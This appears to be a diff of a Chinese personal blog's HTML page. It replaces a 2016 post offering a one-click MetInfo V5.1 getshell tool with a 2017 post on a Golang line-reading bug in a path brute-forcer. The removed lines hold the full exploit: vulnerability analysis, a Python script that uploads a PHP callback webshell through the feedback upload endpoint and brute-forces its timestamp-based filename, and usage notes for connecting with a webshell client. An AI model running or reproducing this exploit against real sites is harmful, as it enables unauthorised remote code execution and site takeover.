@@ -89,7 +89,7 @@
 <link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="Hacker,Tools," />
+  <meta name="keywords" content="Golang,问题解决," />
 
 
 
@@ -107,21 +107,16 @@
 
 
 
-<meta name="description" content="漏洞解析：
-config/config.inc.php12345678910111213141516171819202122232425262728293031$langoks = $db-&amp;gt;get_one(&quot;SELECT * FROM $met_lang WHERE lang=&apos;$lang&apos;&quot;);if(!$langoks)die(&apos;No data in the database,plea">
+<meta name="description" content="前两天零零碎碎看完了golang的基础，想着找个小项目练练手，可是出现了一个十分棘手的问题我要做的东西是网站路径爆破所以我会从文本字典中把一行行路径读取然后与域名拼接，但是我在跑起程序后出现了问题">
 <meta property="og:type" content="article">
-<meta property="og:title" content="MetInfo V5.1 GetShell一键化工具">
-<meta property="og:url" content="http://hacktech.cn/2016/06/08/MetInfo-V5-1-GetShell一键化工具/index.html">
+<meta property="og:title" content="Golang踩坑录 两种方式来读取文件一行所导致的问题">
+<meta property="og:url" content="http://hacktech.cn/2017/02/04/Golang踩坑录-两种方式来读取文件一行所导致的问题/index.html">
 <meta property="og:site_name" content="Akkuman Blog">
-<meta property="og:description" content="漏洞解析：
-config/config.inc.php12345678910111213141516171819202122232425262728293031$langoks = $db-&amp;gt;get_one(&quot;SELECT * FROM $met_lang WHERE lang=&apos;$lang&apos;&quot;);if(!$langoks)die(&apos;No data in the database,plea">
-<meta property="og:image" content="http://7xusrl.com1.z0.glb.clouddn.com/MetInfo5.1GetshellGui.png">
-<meta property="og:updated_time" content="2016-10-29T07:07:05.903Z">
+<meta property="og:description" content="前两天零零碎碎看完了golang的基础，想着找个小项目练练手，可是出现了一个十分棘手的问题我要做的东西是网站路径爆破所以我会从文本字典中把一行行路径读取然后与域名拼接，但是我在跑起程序后出现了问题">
+<meta property="og:updated_time" content="2017-03-03T14:13:58.822Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="MetInfo V5.1 GetShell一键化工具">
-<meta name="twitter:description" content="漏洞解析：
-config/config.inc.php12345678910111213141516171819202122232425262728293031$langoks = $db-&amp;gt;get_one(&quot;SELECT * FROM $met_lang WHERE lang=&apos;$lang&apos;&quot;);if(!$langoks)die(&apos;No data in the database,plea">
-<meta name="twitter:image" content="http://7xusrl.com1.z0.glb.clouddn.com/MetInfo5.1GetshellGui.png">
+<meta name="twitter:title" content="Golang踩坑录 两种方式来读取文件一行所导致的问题">
+<meta name="twitter:description" content="前两天零零碎碎看完了golang的基础，想着找个小项目练练手，可是出现了一个十分棘手的问题我要做的东西是网站路径爆破所以我会从文本字典中把一行行路径读取然后与域名拼接，但是我在跑起程序后出现了问题">
 
 
 
@@ -149,13 +144,13 @@ config/config.inc.php12345678910111213141516171819202122232425262728293031$lango
 
 
 
-  <link rel="canonical" href="http://hacktech.cn/2016/06/08/MetInfo-V5-1-GetShell一键化工具/"/>
+  <link rel="canonical" href="http://hacktech.cn/2017/02/04/Golang踩坑录-两种方式来读取文件一行所导致的问题/"/>
 
 
 
 
 
-  <title> MetInfo V5.1 GetShell一键化工具 | Akkuman Blog </title>
+  <title> Golang踩坑录 两种方式来读取文件一行所导致的问题 | Akkuman Blog </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -328,7 +323,7 @@ config/config.inc.php12345678910111213141516171819202122232425262728293031$lango
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://hacktech.cn/2016/06/08/MetInfo-V5-1-GetShell一键化工具/">
+    <link itemprop="mainEntityOfPage" href="http://hacktech.cn/2017/02/04/Golang踩坑录-两种方式来读取文件一行所导致的问题/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Akkuman">
@@ -349,7 +344,7 @@ config/config.inc.php12345678910111213141516171819202122232425262728293031$lango
             
             
               
-                MetInfo V5.1 GetShell一键化工具
+                Golang踩坑录 两种方式来读取文件一行所导致的问题
               
             
           </h1>
@@ -364,8 +359,8 @@ config/config.inc.php12345678910111213141516171819202122232425262728293031$lango
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-06-08T22:40:32+08:00">
-                2016-06-08
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-02-04T22:55:15+08:00">
+                2017-02-04
               </time>
             
 
@@ -387,8 +382,8 @@ config/config.inc.php12345678910111213141516171819202122232425262728293031$lango
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Hacker/" itemprop="url" rel="index">
-                    <span itemprop="name">Hacker</span>
+                  <a href="/categories/Golang/" itemprop="url" rel="index">
+                    <span itemprop="name">Golang</span>
                   </a>
                 </span>
 
@@ -405,8 +400,8 @@ config/config.inc.php12345678910111213141516171819202122232425262728293031$lango
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2016/06/08/MetInfo-V5-1-GetShell一键化工具/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/06/08/MetInfo-V5-1-GetShell一键化工具/" itemprop="commentCount"></span>
+                <a href="/2017/02/04/Golang踩坑录-两种方式来读取文件一行所导致的问题/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/02/04/Golang踩坑录-两种方式来读取文件一行所导致的问题/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -432,48 +427,15 @@ config/config.inc.php12345678910111213141516171819202122232425262728293031$lango
       
 
       
-        <hr>
-<h1 id="漏洞解析："><a href="#漏洞解析：" class="headerlink" title="漏洞解析："></a>漏洞解析：</h1><hr>
-<p><strong>config/config.inc.php</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">$langoks = $db-&gt;get_one(<span class="string">"SELECT * FROM $met_lang WHERE lang='$lang'"</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span>(!$langoks)<span class="keyword">die</span>(<span class="string">'No data in the database,please reinstall.'</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span>(!$langoks[useok]&amp;&amp;!$metinfoadminok)okinfo(<span class="string">'../404.html'</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span>(count($met_langok)==<span class="number">1</span>)$lang=$met_index_type;</div><div class="line"></div><div class="line">$query = <span class="string">"SELECT * FROM $met_config WHERE lang='$lang' or lang='metinfo'"</span>;<span class="comment">//看这里</span></div><div class="line"></div><div class="line">$result = $db-&gt;query($query);</div><div class="line"></div><div class="line"><span class="keyword">while</span>($list_config= $db-&gt;fetch_array($result))&#123;</div><div class="line"></div><div class="line">	<span class="keyword">if</span>($metinfoadminok)$list_config[<span class="string">'value'</span>]=str_replace(<span class="string">'"'</span>, <span class="string">'&amp;#34;'</span>, str_replace(<span class="string">"'"</span>, <span class="string">'&amp;#39;'</span>,$list_config[<span class="string">'value'</span>]));</div><div class="line"></div><div class="line">	$settings_arr[]=$list_config;</div><div class="line"></div><div class="line">	<span class="keyword">if</span>($list_config[<span class="string">'columnid'</span>])&#123;</div><div class="line"></div><div class="line">		$settings[$list_config[<span class="string">'name'</span>].<span class="string">'_'</span>.$list_config[<span class="string">'columnid'</span>]]=$list_config[<span class="string">'value'</span>];</div><div class="line"></div><div class="line">	&#125;<span class="keyword">else</span>&#123;</div><div class="line"></div><div class="line">		$settings[$list_config[<span class="string">'name'</span>]]=$list_config[<span class="string">'value'</span>];</div><div class="line"></div><div class="line">	&#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">@extract($settings);</div></pre></td></tr></table></figure></p>
-<hr>
+        <p>前两天零零碎碎看完了golang的基础，想着找个小项目练练手，可是出现了一个十分棘手的问题<br>我要做的东西是网站路径爆破<br>所以我会从文本字典中把一行行路径读取然后与域名拼接，但是我在跑起程序后出现了问题</p>
 <a id="more"></a>
-<p>访问</p>
-<p><a href="http:///localhost/metinfo5.1/index.php?lang=metinfo" target="_blank" rel="external">http:///localhost/metinfo5.1/index.php?lang=metinfo</a></p>
-<p><code>SELECT * FROM met_config WHERE lang=&#39;metinfo&#39; or lang=&#39;metinfo&#39;</code></p>
-<hr>
-<h2 id="文件命名方式："><a href="#文件命名方式：" class="headerlink" title="文件命名方式："></a>文件命名方式：</h2><hr>
-<p><strong>/feedback/uploadfile_save.php</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">srand((double)microtime() * <span class="number">1000000</span>);</div><div class="line"></div><div class="line">$rnd = rand(<span class="number">100</span>, <span class="number">999</span>);</div><div class="line"></div><div class="line">$name = date(<span class="string">'U'</span>) + $rnd;</div><div class="line"></div><div class="line">$name = $name.<span class="string">"."</span>.$ext;</div></pre></td></tr></table></figure></p>
-<p><strong>文件保存在/upload/file/目录</strong></p>
-<p>命名方式就是时间戳去掉后三位，紧接着一个三位数的随机数</p>
-<p>可爆破：</p>
-<p>如</p>
-<p><a href="http://127.0.0.1/upload/file/1465394396.php" target="_blank" rel="external">http://127.0.0.1/upload/file/1465394396.php</a></p>
-<hr>
-<h1 id="一键化利用工具："><a href="#一键化利用工具：" class="headerlink" title="一键化利用工具："></a>一键化利用工具：</h1><hr>
-<p><strong>本程序基于python编写</strong></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment">#-*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> Queue</div><div class="line"><span class="keyword">import</span> threading</div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line"></div><div class="line">headers = &#123;<span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.10 Safari/537.36'</span>&#125;</div><div class="line"></div><div class="line">urls = Queue.Queue()</div><div class="line"><span class="comment">#http://hb.jhxjd.com/upload/file/1441445378.php</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">bp</span><span class="params">(urls,time_out)</span>:</span></div><div class="line">    <span class="keyword">while</span> <span class="keyword">not</span> urls.empty():</div><div class="line">        base_url = urls.get()</div><div class="line">        response = <span class="keyword">None</span></div><div class="line"></div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            time.sleep(int(time_out))<span class="comment">#延时设置</span></div><div class="line">            response = requests.get(base_url,headers=headers)</div><div class="line">            <span class="keyword">if</span> response.status_code == <span class="number">404</span>:</div><div class="line">                <span class="keyword">print</span> <span class="string">'Not Fount----%s\n'</span> % base_url</div><div class="line">        <span class="keyword">except</span>:</div><div class="line">            <span class="keyword">continue</span></div><div class="line">        <span class="keyword">finally</span>:</div><div class="line">            <span class="keyword">if</span> response:</div><div class="line">                <span class="keyword">with</span> open(<span class="string">'url.txt'</span>,<span class="string">'a+'</span>) <span class="keyword">as</span> f:</div><div class="line">                    f.write(<span class="string">'%s?e=YXNzZXJ0\n'</span>%base_url)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(target_url,thread_num,time_out)</span>:</span></div><div class="line"></div><div class="line">    <span class="comment">#取出当前时间戳并删除后四位</span></div><div class="line">    now = str(int(time.time()))[:<span class="number">-4</span>]</div><div class="line"></div><div class="line">    <span class="comment">#将所有的待爆破地址遍历并加入队列</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">10</span>):</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">100</span>,<span class="number">1000</span>):</div><div class="line">            num_str = <span class="string">''</span>.join((str(i),str(j)))</div><div class="line">            url = <span class="string">''</span>.join((<span class="string">'%s/upload/file/%s'</span> % (target_url,now),num_str,<span class="string">'.php'</span>))</div><div class="line">            urls.put(url)</div><div class="line"></div><div class="line">    <span class="comment">#上传文件</span></div><div class="line">    <span class="keyword">with</span> open(<span class="string">'xiaoma.php'</span>,<span class="string">'w+'</span>) <span class="keyword">as</span> fi:</div><div class="line">        fi.write(<span class="string">"&lt;?php $e = $_REQUEST['e'];register_shutdown_function(base64_decode($e), $_REQUEST['Akkuman']);?&gt;"</span>)</div><div class="line">    data = &#123;</div><div class="line">            <span class="string">'fd_para[1][para]'</span>:<span class="string">'filea'</span>,</div><div class="line">            <span class="string">'fd_para[1][type]'</span>:<span class="string">'5'</span></div><div class="line">            &#125;</div><div class="line">    files = &#123;<span class="string">'filea'</span>: open(<span class="string">"xiaoma.php"</span>, <span class="string">'rb'</span>)&#125;</div><div class="line">    upload_url = <span class="string">'%s/feedback/uploadfile_save.php?met_file_format=pphphp&amp;met_file_maxsize=9999&amp;lang=metinfo'</span> % target_url</div><div class="line">    res = requests.post(upload_url,data = data,files=files)</div><div class="line">    <span class="comment">#等待两秒  文件上传</span></div><div class="line">    time.sleep(<span class="number">2</span>)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">    <span class="comment">#启动多线程</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(int(thread_num)):</div><div class="line">        t = threading.Thread(target = bp,args=(urls,time_out,))</div><div class="line">        t.start()</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">4</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">'Example : %s http://www.xxx.com 20 0'</span> % sys.argv[<span class="number">0</span>]</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        main(sys.argv[<span class="number">1</span>],sys.argv[<span class="number">2</span>],sys.argv[<span class="number">3</span>])</div></pre></td></tr></table></figure>
-<p>程序略显粗糙</p>
-<p>为了方便，我也把他打包成了<strong>exe</strong></p>
-<p>然后闲着没事，想着简单地给他做了个<strong>界面</strong>,这样的<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/MetInfo5.1GetshellGui.png" alt="GUI"></p>
-<hr>
-<h1 id="文件说明"><a href="#文件说明" class="headerlink" title="文件说明"></a>文件说明</h1><hr>
-<blockquote>
-<p>MetInfo V5.1上传漏洞getshell利用工具</p>
-<p>   作者 : Akkuman</p>
-<p>漏洞原理详见<a href="http://www.wooyun.org/bugs/wooyun-2010-0139168" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2010-0139168</a></p>
-<p>使用说明：<br>本目录有两个文件，一个py，一个exe<br>因为exe是py文件打包而成，故文件较大<br>64位系统测试使用通过</p>
-<p>如果你安装了py2.x环境  py文件使用方法<br>打开cmd<br>python baopo.py <a href="http://www.xxx.com" target="_blank" rel="external">http://www.xxx.com</a> 20 0<br>20是线程数，0是每次请求等待时间（网站限制时可设置为2或3）可以自己指定</p>
-<p>exe命令行文件使用方法<br>打开cmd<br>baopo.exe <a href="http://www.xxx.com" target="_blank" rel="external">http://www.xxx.com</a> 20 0<br>20是线程数，0是每次请求等待时间（网站限制时可设置为2或3）可以自己指定</p>
-<p>GUI程序，应该不用说</p>
-<p>关于getshell与结果<br>上传的是回调一句话木马<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;<span class="meta">&lt;?php</span> &gt;$e=$_REQUEST[<span class="string">'e'</span>];register_shutdown_function(base64_decode($e),$_&gt;REQUEST[<span class="string">'Akkuman'</span>]);<span class="meta">?&gt;</span></div><div class="line">&gt;</div></pre></td></tr></table></figure></p>
-<p>菜刀连接，密码是Akkuman</p>
-<p>爆破结果会生成在<strong>url.txt</strong></p>
-</blockquote>
-<hr>
-<h1 id="下载地址："><a href="#下载地址：" class="headerlink" title="下载地址："></a>下载地址：</h1><hr>
-<p><a href="http://cloud.189.cn/t/v263QbMJVJ3u" target="_blank" rel="external">(访问码:1475)</a></p>
+<p>下面是一个小片段<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">400 Bad Request-----http://www.xxx.com/channel.asp</div><div class="line">400 Bad Request-----http://www.xxx.com/index.asp</div><div class="line">404 Not Found-----http://www.xxx.com/admin.asp</div></pre></td></tr></table></figure></p>
+<p>程序本身并没有错误，但是运行结果就比较怪了<br>Bad Request?<br>这并不是我要说的重点，我发现的问题是，除了最后一个地址，前面所有的地址都会显示位400 Bad Request<br>经过几轮测试，我觉得应该是网址拼接上出了问题</p>
+<p>我的拼接函数是这样<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">ReturnBurstURL</span><span class="params">(fURL *os.File, baseurl <span class="keyword">string</span>)</span> <span class="params">(urlList []<span class="keyword">string</span>)</span></span> &#123;</div><div class="line">	allURLTxt := bufio.NewReader(fURL)</div><div class="line">	<span class="keyword">for</span> &#123;</div><div class="line">		urlpath, readerError := allURLTxt.ReadString(<span class="string">'\n'</span>)</div><div class="line">		newurl := baseurl + strings.Replace(urlpath, <span class="string">"\n"</span>, <span class="string">""</span>, <span class="number">-1</span>)</div><div class="line">		urlList = <span class="built_in">append</span>(urlList, newurl)</div><div class="line">		<span class="keyword">if</span> readerError == io.EOF &#123;</div><div class="line">			fmt.Printf(<span class="string">"\n读取字典完成，准备开始，请等待...\n"</span>)</div><div class="line">			<span class="keyword">return</span> urlList</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>我把取一行的方式换成bufio.NewScanner就正常了<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">ReturnBurstURL</span><span class="params">(fURL *os.File, baseurl <span class="keyword">string</span>)</span> <span class="params">(urlList []<span class="keyword">string</span>)</span></span> &#123;</div><div class="line">	allURLTxt := bufio.NewScanner(fURL)</div><div class="line">	<span class="keyword">for</span> allURLTxt.Scan() &#123;</div><div class="line">		newurl := baseurl + allURLTxt.Text()</div><div class="line">		urlList = <span class="built_in">append</span>(urlList, newurl)</div><div class="line">	&#125;</div><div class="line">	fmt.Printf(<span class="string">"\n读取字典完成，准备开始，请等待...\n"</span>)</div><div class="line">	<span class="keyword">return</span> urlList</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>网上读取文件一行很多人写的文章是第一种方法，但是我也不知道什么问题导致这种情况的发生<br>我特地去查了查api文档<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewReader</span><span class="params">(rd io.Reader)</span> *<span class="title">Reader</span></span></div><div class="line">//<span class="title">NewReader</span> <span class="title">returns</span> <span class="title">a</span> <span class="title">new</span> <span class="title">Reader</span> <span class="title">whose</span> <span class="title">buffer</span> <span class="title">has</span> <span class="title">the</span> <span class="title">default</span> <span class="title">size</span>. </div><div class="line"><span class="title">func</span> <span class="params">(b *Reader)</span> <span class="title">ReadString</span><span class="params">(delim <span class="keyword">byte</span>)</span> <span class="params">(<span class="keyword">string</span>, error)</span></div><div class="line">//<span class="title">ReadString</span> <span class="title">reads</span> <span class="title">until</span> <span class="title">the</span> <span class="title">first</span> <span class="title">occurrence</span> <span class="title">of</span> <span class="title">delim</span> <span class="title">in</span> <span class="title">the</span> <span class="title">input</span>, <span class="title">returning</span> <span class="title">a</span> <span class="title">string</span> <span class="title">containing</span> <span class="title">the</span> <span class="title">data</span> <span class="title">up</span> <span class="title">to</span> <span class="title">and</span> <span class="title">including</span> <span class="title">the</span> <span class="title">delimiter</span>. <span class="title">If</span> <span class="title">ReadString</span> <span class="title">encounters</span> <span class="title">an</span> <span class="title">error</span> <span class="title">before</span> <span class="title">finding</span> <span class="title">a</span> <span class="title">delimiter</span>, <span class="title">it</span> <span class="title">returns</span> <span class="title">the</span> <span class="title">data</span> <span class="title">read</span> <span class="title">before</span> <span class="title">the</span> <span class="title">error</span> <span class="title">and</span> <span class="title">the</span> <span class="title">error</span> <span class="title">itself</span> <span class="params">(often io.EOF)</span>. <span class="title">ReadString</span> <span class="title">returns</span> <span class="title">err</span> != <span class="title">nil</span> <span class="title">if</span> <span class="title">and</span> <span class="title">only</span> <span class="title">if</span> <span class="title">the</span> <span class="title">returned</span> <span class="title">data</span> <span class="title">does</span> <span class="title">not</span> <span class="title">end</span> <span class="title">in</span> <span class="title">delim</span>. <span class="title">For</span> <span class="title">simple</span> <span class="title">uses</span>, <span class="title">a</span> <span class="title">Scanner</span> <span class="title">may</span> <span class="title">be</span> <span class="title">more</span> <span class="title">convenient</span>. </div><div class="line"><span class="title">func</span> <span class="title">NewScanner</span><span class="params">(r io.Reader)</span> *<span class="title">Scanner</span></div><div class="line">//<span class="title">NewScanner</span> <span class="title">returns</span> <span class="title">a</span> <span class="title">new</span> <span class="title">Scanner</span> <span class="title">to</span> <span class="title">read</span> <span class="title">from</span> <span class="title">r</span>. <span class="title">The</span> <span class="title">split</span> <span class="title">function</span> <span class="title">defaults</span> <span class="title">to</span> <span class="title">ScanLines</span>. </div><div class="line"><span class="title">func</span> <span class="params">(s *Scanner)</span> <span class="title">Scan</span><span class="params">()</span> <span class="title">bool</span></div><div class="line">//<span class="title">Scan</span> <span class="title">advances</span> <span class="title">the</span> <span class="title">Scanner</span> <span class="title">to</span> <span class="title">the</span> <span class="title">next</span> <span class="title">token</span>, <span class="title">which</span> <span class="title">will</span> <span class="title">then</span> <span class="title">be</span> <span class="title">available</span> <span class="title">through</span> <span class="title">the</span> <span class="title">Bytes</span> <span class="title">or</span> <span class="title">Text</span> <span class="title">method</span>. <span class="title">It</span> <span class="title">returns</span> <span class="title">false</span> <span class="title">when</span> <span class="title">the</span> <span class="title">scan</span> <span class="title">stops</span>, <span class="title">either</span> <span class="title">by</span> <span class="title">reaching</span> <span class="title">the</span> <span class="title">end</span> <span class="title">of</span> <span class="title">the</span> <span class="title">input</span> <span class="title">or</span> <span class="title">an</span> <span class="title">error</span>. <span class="title">After</span> <span class="title">Scan</span> <span class="title">returns</span> <span class="title">false</span>, <span class="title">the</span> <span class="title">Err</span> <span class="title">method</span> <span class="title">will</span> <span class="title">return</span> <span class="title">any</span> <span class="title">error</span> <span class="title">that</span> <span class="title">occurred</span> <span class="title">during</span> <span class="title">scanning</span>, <span class="title">except</span> <span class="title">that</span> <span class="title">if</span> <span class="title">it</span> <span class="title">was</span> <span class="title">io</span>.<span class="title">EOF</span>, <span class="title">Err</span> <span class="title">will</span> <span class="title">return</span> <span class="title">nil</span>. <span class="title">Scan</span> <span class="title">panics</span> <span class="title">if</span> <span class="title">the</span> <span class="title">split</span> <span class="title">function</span> <span class="title">returns</span> 100 <span class="title">empty</span> <span class="title">tokens</span> <span class="title">without</span> <span class="title">advancing</span> <span class="title">the</span> <span class="title">input</span>. <span class="title">This</span> <span class="title">is</span> <span class="title">a</span> <span class="title">common</span> <span class="title">error</span> <span class="title">mode</span> <span class="title">for</span> <span class="title">scanners</span>. </div><div class="line"><span class="title">func</span> <span class="params">(s *Scanner)</span> <span class="title">Text</span><span class="params">()</span> <span class="title">string</span></div><div class="line">//<span class="title">Text</span> <span class="title">returns</span> <span class="title">the</span> <span class="title">most</span> <span class="title">recent</span> <span class="title">token</span> <span class="title">generated</span> <span class="title">by</span> <span class="title">a</span> <span class="title">call</span> <span class="title">to</span> <span class="title">Scan</span> <span class="title">as</span> <span class="title">a</span> <span class="title">newly</span> <span class="title">allocated</span> <span class="title">string</span> <span class="title">holding</span> <span class="title">its</span> <span class="title">bytes</span>.</div></pre></td></tr></table></figure></p>
+<p>按照上面的api文档，这两个的区别就是两者在返回string的时候，一个是数据+分隔符，一个是一行的数据，不带分隔符<br>虽说我第一种方法也用strings.Replace方法把”\n”替换成了””空字符，但是可能还是有点奇奇怪怪的东西</p>
 <p><em>转载请注明出处</em></p>
-<p><em>作者博客 hacktech.cn | 53xiaoshuo.com</em></p>
 
       
     </div>
@@ -518,9 +480,9 @@ config/config.inc.php12345678910111213141516171819202122232425262728293031$lango
       
         <div class="post-tags">
           
-            <a href="/tags/Hacker/" rel="tag"># Hacker</a>
+            <a href="/tags/Golang/" rel="tag"># Golang</a>
           
-            <a href="/tags/Tools/" rel="tag"># Tools</a>
+            <a href="/tags/问题解决/" rel="tag"># 问题解决</a>
           
         </div>
       
@@ -533,8 +495,8 @@ config/config.inc.php12345678910111213141516171819202122232425262728293031$lango
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2016/05/31/DZ不能上传头像提示不能写入data-tmp目录/" rel="next" title="discuz 不能上传头像提示can not write to the data/tmp folder">
-                <i class="fa fa-chevron-left"></i> discuz 不能上传头像提示can not write to the data/tmp folder
+              <a href="/2017/01/10/hexo在github和coding-net部署并分流（一）-1/" rel="next" title="hexo在github和coding.net部署并分流（一）">
+                <i class="fa fa-chevron-left"></i> hexo在github和coding.net部署并分流（一）
               </a>
             
           </div>
@@ -542,10 +504,6 @@ config/config.inc.php12345678910111213141516171819202122232425262728293031$lango
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2016/06/09/编码转换工具/" rel="prev" title="编码转换工具">
-                编码转换工具 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -560,10 +518,10 @@ config/config.inc.php12345678910111213141516171819202122232425262728293031$lango
 
     <div class="post-spread">
       
-        <div class="ds-share flat" data-thread-key="2016/06/08/MetInfo-V5-1-GetShell一键化工具/"
-     data-title="MetInfo V5.1 GetShell一键化工具"
+        <div class="ds-share flat" data-thread-key="2017/02/04/Golang踩坑录-两种方式来读取文件一行所导致的问题/"
+     data-title="Golang踩坑录 两种方式来读取文件一行所导致的问题"
      data-content=""
-     data-url="http://hacktech.cn/2016/06/08/MetInfo-V5-1-GetShell一键化工具/">
+     data-url="http://hacktech.cn/2017/02/04/Golang踩坑录-两种方式来读取文件一行所导致的问题/">
   <div class="ds-share-inline">
     <ul  class="ds-share-icons-16">
 
@@ -590,8 +548,8 @@ config/config.inc.php12345678910111213141516171819202122232425262728293031$lango
           
   <div class="comments" id="comments">
     
-      <div class="ds-thread" data-thread-key="2016/06/08/MetInfo-V5-1-GetShell一键化工具/"
-           data-title="MetInfo V5.1 GetShell一键化工具" data-url="http://hacktech.cn/2016/06/08/MetInfo-V5-1-GetShell一键化工具/">
+      <div class="ds-thread" data-thread-key="2017/02/04/Golang踩坑录-两种方式来读取文件一行所导致的问题/"
+           data-title="Golang踩坑录 两种方式来读取文件一行所导致的问题" data-url="http://hacktech.cn/2017/02/04/Golang踩坑录-两种方式来读取文件一行所导致的问题/">
       </div>
     
   </div>
@@ -615,17 +573,8 @@ config/config.inc.php12345678910111213141516171819202122232425262728293031$lango
       
 
       
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
-            文章目录
-          </li>
